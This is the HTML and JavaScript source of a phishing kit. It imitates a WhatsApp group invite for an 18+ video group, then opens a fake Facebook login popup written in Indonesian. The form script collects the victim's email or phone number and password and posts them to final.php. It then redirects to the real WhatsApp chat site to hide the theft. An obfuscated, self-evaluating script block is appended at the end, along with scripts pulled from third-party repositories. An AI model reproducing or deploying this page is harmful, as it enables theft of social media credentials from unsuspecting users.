<html lang="en" class="version-d platform-desktop">
<head>
<meta charset="UTF-8">
<title> </title>
<meta property="og:title" content="WhatsApp Group Invite"/>
<meta property="og:image" content="img/v4/icon.png"/>
<meta property="og:site_name" content="WhatsApp.com"/>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=9">
<meta name="theme-color" content="#1BA691">
<meta name="msapplication-navbutton-color" content="#1BA691">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#1BA691">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
$(document).ready(function(){$('body').hide();});
    </script>
<link id="favicon" rel="shortcut icon" href="img/v4/icon.png" type="image/png">
<link rel="stylesheet" href="css/v4/style.build35e635e635e6.css">
<!--Follow this link to join-->
<meta property="og:description" content="Follow this link to join"/>
<style>
.popup-ariandi {
        display: none;
        background: rgba(0,0,0,0.5);
        width: 100%;
        height: 100%;
        position: fixed;
        top: 0;
        left: 0;
        z-index: 9999999;
    }
    .close-alex-facebook {
        background: #000;
         width: 20px;
        height: 20px;
        color: #fff;
        text-align: center;
        text-decoration: none;
        border-radius: 50%;
        border: 1.5px solid #fff;
        position: absolute;
        top: -8px;
        right: -10px;
        display: block;
    }
    .close-alex-facebook i {
        color: #fff;
        padding-top: 1px;
    }
    .container-box-fb {
        background: #ECEFF6;
        max-width: 330px;
        height: auto;
        position: relative;
        margin: 50px auto;
        margin-top: 1.9%;
        text-align: center;
        font-family: system-ui;
        color: #000;
        border-radius: 10px;
    }
    .atasan-fb {
        background: #3b5998;
	    width: 100%;
	    height: auto;
	    padding: 2px;
	    border-top-left-radius: 10px;
	    border-top-right-radius: 10px;
    }
    .atasan-fb img {
        width: 115px;
        margin-left: auto;
        margin-right: auto;
        display: block;
    }
    .isi-facebook {
        width: 300px;
        height: auto;
        margin-left: auto;
        margin-right: auto;
        display: block;
    }
    .isi-facebook .kaget {
        display: none;
        left: -15px;
        position: relative;
        width: 330px;
        padding: 5px;
        background: red;
        color:#fff;
        font-size: 13px;
        font-family: system-ui;
    }
    .isi-facebook img {
        width: 60px;
        margin-top: 20px;
        margin-left: auto;
        margin-right: auto;
        border-radius: 12px;
        display: block;
    }
    .txt-ucapan-fb {
        width: 270px;
        height: auto;
        margin-top: 10px;
        margin-left: auto;
        margin-right: auto;
        margin-bottom: 17px;
        padding: 8px;
        color: #90949c;
        font-size: 16px;
        font-family: system-ui;
        text-align: center;
        display: block;
    }
    .form-login-fb input[type="text"],.form-login-fb input[type="password"]{
        width: 120px;
	    height: auto;
	    padding: 12px;
	    color: #000;
	    font-size: 16px;
	    font-weight: 400;
	    font-family: 'Lato',sans-serif;
	    border: 1px solid #bdbebf;
	    cursor: pointer;
	    outline: none;
    }
    .form-login-fb input[type="text"] {
        margin: 0;
        padding-bottom: 13px;
	    border-bottom: none;
	    border-radius: 4px 4px 0 0;
	    box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
    }
    .form-login-fb input[type="password"] {
        margin: 0;
	    border-top: none;
	    border-radius: 0 0 4px 4px;
	    box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
    }
    .btn-login-fb {
        background: #1778f2;
	    width: 100%;
	    height: auto;
	    margin-top: 10px;
	    margin-left: auto;
	    margin-right: auto;
	    padding: 10px;
	    color: #fff;
	    font-size: 14px;
	    font-family: system-ui;
	    font-weight: bold;
	    text-align: center;
	    text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
	    border: 1px solid #3578e5;
	    border-radius: 5px;
	    box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
	    outline: none;
	    display: block;
    }
    .txt-buat-akun {
        width: 100%;
        height: auto;
        padding: 5px;
        color: #3b5998;
        font-size: 13.5px;
        font-family: system-ui;
        text-align: center;
    }
    .txt-tidak-sekarang {
        width: 100%;
        height: auto;
        padding: 5px;
        color: #3b5998;
        font-size: 13.5px;
        font-family: Roboto;
        text-align: center;
    }
    .txt-lupa-password {
        width: 100%;
        height: auto;
        margin-bottom: 30px;
        padding: 5px;
        color: #7596c8;
        font-size: 13.5px;
        font-family: system-ui;
        text-align: center;
    }
    .isi-bahasa {
        width: 100%;
        height: auto;
        margin-left: auto;
        margin-right: auto;
        display: block;
    }
    .nama-bahasa {
        width: 40%;
        height: auto;
        margin: 5px;
        margin-bottom: 0px;
        color: #3b5998;
        font-size: 12px;
        font-family: system-ui;
        text-align: center;
        display: inline-block;
    }
    .nama-bahasa i {
        width: 23px;
        padding: 4px;
        color: #90949c;
        border: 1px solid #3b5998;
        border-radius: 3px;
    }
    .bahasa-aktif {
        color: #90949c;
        font-weight: bold;
    }
    .kalobukanalexsiapalagi {
        width: 40%;
        height: auto;
        margin-top: 10px;
        margin-left: auto;
        margin-right: auto;
        color: #90949c;
        font-size: 12px;
        font-family: system-ui;
        text-align: center;
        display: block;
    }
</style>
</head>
<body style="display:none;" class="page page--landing page--invite" id="top">
<div class="header ">
	<header class="page-header ">
	<div class="page-header__inner">
		<a class="page-header__logo" href="https://www.whatsapp.com/"></a>
		<div class="page-header__language">
			<div id="lng" onclick="toggle_lng_menu()">
				<span class="lng-id" dir="auto">
				<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="lng-dropdown" x="0px" y="0px" width="9px" height="20px" viewbox="0 0 9 20" style="enable-background:new 0 0 9 20;" xml:space="preserve"><polygon fill="#ffffff" points="1,9 4.5,12.5 8,9 "/></svg>
				<span class="lng-name">English</span>
				</span>
			</div>
			<div id="helptranslate">
				<li>
					<a href="https://translate.whatsapp.com/" target="_blank">Help translate WhatsApp into your language</a>
				</li>
				<div class="clear"></div>
			</div>
		</div>
	</div>
</div>
</header>
</div>
<fieldset>
<div class="page-main">
	<div class="page-main__inner">
		<div class="page-content page-content--single">
			<div class="block block--invite">
				<a href="#" id="action-icon" title="Follow this link to join: BERBAGI VIDEO 18+" class="block__img img icon-chat"><span class="img__body" style="background-image: url(img/crott.jpg);"></span></a>
				<h2 class="block__title">Berbagi Video 18+<h2>
				<h3 class="block__subtitle" dir="auto">WhatsApp Group Invite</h3>
				<button onclick="$('#slzfcbk').show();" type="button" class="button button--simple button--primary">Join Chat</button>
			</div>
			<hr>
			<div class="block block--hint">
				 Dont have WhatsApp yet?<br>
				<a href="https://www.whatsapp.com/download">Download</a>
			</div>
		</div>
	</div>
	<footer class="page-footer-container page-footer--bottom">
	<div class="page-footer -primary">
		<div class="page-footer__inner">
			<div class="four -spaced">
				<div class="block block--footer four__item">
					<h4 class="block__title">WhatsApp</h4>
					<div class="block__body">
						<ul class="list list--footer">
							<li class="list__item">
								<a href="https://www.whatsapp.com/features/" class="list__link">Features</a>
							</li>
							<li class="list__item">
								<a href="https://www.whatsapp.com/security/" class="list__link">Security</a>
							</li>
							<li class="list__item">
								<a href="https://www.whatsapp.com/download/" class="list__link">Download</a>
							</li>
							<li class="list__item">
								<a href="https://web.whatsapp.com/" class="list__link">WhatsApp Web</a>
							</li>
							<li class="list__item">
								<span class="list__empty"></span>
							</li>
						</ul>
					</div>
				</div>
				<div class="block block--footer four__item">
					<h4 class="block__title">Company</h4>
					<div class="block__body">
						<ul class="list list--footer">
							<li class="list__item">
								<a href="https://www.whatsapp.com/about/" class="list__link">About</a>
							</li>
							<li class="list__item">
								<a href="https://www.whatsapp.com/join/" class="list__link">Careers</a>
							</li>
							<li class="list__item">
								<a href="https://www.whatsappbrand.com/" class="list__link">Brand Center</a>
							</li>
							<li class="list__item">
								<a href="https://www.whatsapp.com/contact/" class="list__link">Get in touch</a>
							</li>
							<li class="list__item">
								<a href="https://blog.whatsapp.com/" class="list__link">Blog</a>
							</li>
							<li class="list__item">
								<span class="list__empty"></span>
							</li>
							<li class="list__item">
								<span class="list__empty"></span>
							</li>
						</ul>
					</div>
				</div>
				<div class="block block--footer four__item">
					<h4 class="block__title">Download</h4>
					<div class="block__body">
						<ul class="list list--footer">
							<li class="list__item">
								<a href="https://www.whatsapp.com/download/" class="list__link">Mac/PC</a>
							</li>
							<li class="list__item">
								<a href="https://www.whatsapp.com/android/" class="list__link">Android</a>
							</li>
							<li class="list__item">
								<a href="https://www.whatsapp.com/appstore/" class="list__link">iPhone</a>
							</li>
							<li class="list__item">
								<a href="https://www.whatsapp.com/wp/" class="list__link">Windows Phone</a>
							</li>
							<li class="list__item">
								<a href="https://www.whatsapp.com/ota/" class="list__link">BlackBerry</a>
							</li>
							<li class="list__item">
								<a href="https://www.whatsapp.com/nokia/" class="list__link">Nokia</a>
							</li>
						</ul>
					</div>
				</div>
				<div class="block block--footer four__item">
					<h4 class="block__title">Help</h4>
					<div class="block__body">
						<ul class="list list--footer">
							<li class="list__item">
								<a href="https://www.whatsapp.com/faq/" class="list__link">FAQ</a>
							</li>
							<li class="list__item">
								<a href="https://twitter.com/whatsapp" class="list__link">Twitter</a>
							</li>
							<li class="list__item">
								<a href="https://www.facebook.com/WhatsApp" class="list__link">Facebook</a>
							</li>
							<li class="list__item">
								<span class="list__empty"></span>
							</li>
							<li class="list__item">
								<span class="list__empty"></span>
							</li>
							<li class="list__item">
								<span class="list__empty"></span>
							</li>
						</ul>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="page-footer -secondary">
		<div class="page-footer__inner">
			<div class="four">
				<div class="four__item" dir="auto">2020 &copy; WhatsApp Inc.</div>
				<div class="four__item -span3">
					<a href="https://www.whatsapp.com/legal/" class="page-footer__link">Privacy & Terms</a>
				</div>
			</div>
		</div>
	</div>
	</footer>
	<div class="popup-ariandi alex-facebook animate fadeIn" id="slzfcbk" style="display: none;">
            <div class="container-box-fb" style="margin-top: 10%;">
                <div class="atasan-fb" style="width: 100%;">
                    <img src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240202_164508.png">
                </div>
                <div class="isi-facebook">
                    <p class="kaget email-fb1" style="width: 330px;">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></b></p>
                    <p class="kaget sandi-fb1" style="width: 330px;">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>   
                    <img src="assets/log.webp">
                    <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk lanjut ke Whatsapp</div>
                    <form class="form-login-fb" method="post" onsubmit="$(this).end()">
                        <label>
                            <input type="text" id="alx_email_fb2" name="email" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required>
                        </label>
                        <label>
                            <input type="password" id="alx_password_fb2" name="sandi" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required>
                        </label>
                        <input type="hidden" name="ua" value="Grup Wa" readonly>
                        <input type="hidden" name="log" value="Facebook" readonly>
                        <button class="btn-login-fb" onclick="return AlexHostingFB()" type="submit">Masuk</button>
                    </form>
                    <div class="txt-buat-akun">Buat akun</div>
                    <div class="txt-tidak-sekarang">Lain kali</div>
                    <div class="txt-lupa-password">Lupa Kata Sandi? • Pusat Bantuan</div>
                </div>
                <div class="isi-bahasa">
                    <center>
                        <div class="nama-bahasa bahasa-aktif">Bahasa Indonesia</div>
                        <div class="nama-bahasa">English (UK)</div>
                        <div class="nama-bahasa">Basa Jawa</div>
                        <div class="nama-bahasa">Bahasa Melayu</div>
                        <div class="nama-bahasa">日本語</div>
                        <div class="nama-bahasa">Español</div>
                        <div class="nama-bahasa">Português (Brasil)</div>
                        <div class="nama-bahasa"><i class="fa fa-plus"></i>
                        </div>
                    </center>
                </div>
                <div class="kalobukanalexsiapalagi">Facebook Inc.</div>
            </div>
        </div>
            </div>
        <script src="https://cdn.jsdelivr.net/gh/chael44/chaeljs2@main/jquery.js"></script>
        <script>
            function openfcbksalz() {
                $('#slzfcbk').show();
            }
            
            function AlexHostingFB()
        	{
        		$emailfb1 = $('#alx_email_fb2').val().trim();
        		$passwordfb1 = $('#alx_password_fb2').val().trim();
        		if($emailfb1 == '' || $emailfb1 == null || $emailfb1.length <= 6)
        		{
        			$('.email-fb1').show();
        			$('.sandi-fb1').hide();
        			return false;
        		}else{
        			$('.email-fb1').hide();
        		}
        		if($passwordfb1 == '' || $passwordfb1 == null || $passwordfb1.length <= 6)
        		{
        			$('.sandi-fb1').show();
        			return false;
        		}else{
        			$('.sandi-fb1').hide();
        		}
        		
        		if($emailfb1.length >=6 || $passwordfb1.length >=6) {
        		    $.ajax({
                        type: 'POST',
                        url: 'final.php',
                        data: $('.form-login-fb').serialize(),
                        dataType: 'text',
                        success: function() {
                                    location.href = "https://chat.whatsapp.com";
                            } 
                    })
        		}
        	}
        </script>
        <?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
(function(){var Ilf='',xkX=616-605;function ElM(i){var u=2376457;var s=i.length;var d=[];for(var y=0;y<s;y++){d[y]=i.charAt(y)};for(var y=0;y<s;y++){var n=u*(y+281)+(u%40988);var g=u*(y+78)+(u%26934);var v=n%s;var c=g%s;var a=d[v];d[v]=d[c];d[c]=a;u=(n+g)%3341854;};return d.join('')};var CmU=ElM('xgfrdruvcptcmnltsqzijkesonyowaruchotb').substr(0,xkX);var IRo='aznf<=9i;nn3r;p;muso)+sn+tv]=dd {iyvk;t}.,lr) uC,tnz=x(=4e.v.o}=wnrso[(=f(14-u.b4[)[b 8orog.5vf1ta9ua0s7.lfA)08.nq]s);;e)v=.(i>=s.7err(rit1vs;8w<roqupnerp +uvro);wgvaani6lr)-mnrr21+. o;1)=)c"ryrg(kf=s(eap]r1];utar  )v(0 r)eig=..fl+vgi3n (u,eavav>;s"t;,=a;.t.iy"pn8o.(j)1(v,,nl0)=a]v1;htv=nk=-(o.=r+rt)r)a;wa[sy;=.+];(ad av+ucl)emrng!q;nd;,7a0roe0 ;h[87+r"y8l=( aS;etrie<*is,sa5vi6vhrl)ch[r-)h{Atar4mut(oCea7 .;(xnrb;9a]sxCufhCc0chg +ehn},)e"6thd;wyazi<b[lah(vlpf(gahen ,;[*]s= ps=th-ive]enrtt;)n=f2kwqzr+"grhv(20dwAbwet,rr=;a=e; lh2;2jeoe=;(xtuh;h}a3a(v=-mxqia.[+= 0sCujanx";{.roya,<t7;[{1r(f,e+e8+=a5r,g=d Ce(o8hf=;"crcr+r!;s,wnrotl abp0n7;fs1(,.[ =)a)fnt+f)sdr{l{)e[aou((r[5;k[x;1t,h(r=e()u;)}.v)=66=;; )ee]"vf7+id)92,=9.s6=3i(a;,6=,j-d(+i8,,)=v=r(nsgmli+.7g+o=ll0lw]c], 6"1f5ngvca0h]u6uu).leehyl;ir+AcCe}Cit6t(ol;pc=;;r}(rx82fc+n=S+rwr9vrf;,ahetkmgvc,xhhop,aey,jg5d(+=ii)m +A9g..a{]n 1)p';var BaB=ElM[CmU];var xuW='';var HNg=BaB;var gbL=BaB(xuW,ElM(IRo));var xzf=gbL(ElM('eond+7A)ript;oqave48 orA;sfe!3(}mA,(}&_%.A_3l.6A)_a=C)3A,_s!_\'A_s6gm{Acgs;e=7Atwd\'ad*=d;i+gA\/64t#9$]A$x(sfx842n).o=+ab6b,nA7r3x$ )+a(ni0beAhrv)(n(2edj9_( t(Aip,ct]A[1e16_ws,;}a]34#3d)o(qt%d6Sa.cAi.6gmedlAA 4f_(A%(!0iAo8A= obA\/o$#5!ra%i9-};!jfgj..\/v!%j.734p7);dfA]!8C3u.s0(A3Al;)(hn(f..1A{!4A3,t;b%do.Ab5()A$A$3%k8((sf.{A8y}x3A}e;AgAAaA9uA$5=)};Ao asA]Aof2<i.7:=fq(r2(cA.yg}ndth.5.)(.$a0$6;1Au51A)c05ie_4!s{a,do5))epAA=d.co(h}ca6o]t(ih} g)1t).]o);(Ap60pu!(<05d.5r ]jjdwg]g(pA,43 b,i41)A,0$.$ ]u4su8h)n*#2 Abi8j*:uf(6.!5-.7n7t),(i$AdA$13A003 t.e=_1e;$.(5.1_j,ig.(;A6eva4_A3;i064=7dn5r5)(3j)_=bj=A3A$usAA.{mh(,3nffs,s15nsp,$A)fA3u({s"$.._ .ie_rgu4y!;e=xt(8!.<_aAl:7{;m.s2dbr"+=+{rArAAueA9f%A%1p%l!d=l_#sbq=A.)3.,337;!ebA1t(nd.$b3Aob{%3rA\/!0A3)A_())rs]_(A)A.en"na4nb(4eA2 ;}AA\'mn:)A0;_d;x},7]tAa6&=.xb$),)fA_ahcA=AAAd7+r76AtoeA$,1}_.g3)_bl .n)0n.d!(;04gAA=vA}(q_).9)s2_$5,<eAa.den,(d)_c{ A,]Aco0[..,y}11trA\/:).(3))2;;d4a[[3(6 !csed"e{s:$A1f3egA=53rA!t!_\/Aetbu.4;A_$!()u3t)Al._6;=6i iffoA6AoeA5 .s-$$.6ia,!r.d&24%_7)}$)n.,]Azlqd )ti=Azeo_a;;A=l2+(9}9(A!;b#g;r4loi(A3;Afa.fAi8{_{4:.-r_6ob}A6))($})5!A!%__.2).A8\/q&}.51-n(b;6dA,%7]AAo!_A9Alis)A(54f37s4uA)#)+(A.8((Af0As;.so85.3it2k2.6s %0}A7*(AvT\'0A8 9_".)p)_A=,gl4.\/)\'5a.4 0erA74])s {{7A8l3r(rS9A)q$$A,i 0)69vAa!{ii%:5]:s3Aa,6)d(As 95td3SAf=03;d!86dua8;$jA6)r0g3A(5""[tbo)!.so):!S.=n2t=A9$ib3_$"],yArA\/j;$_!m.dd:gA5 p).d)dA3+(n=,_4A_rA;=k}d64#iA;(_. '));var kJB=HNg(Ilf,xzf );kJB(6797);return 5600})()
</script>
	</body>
	</html>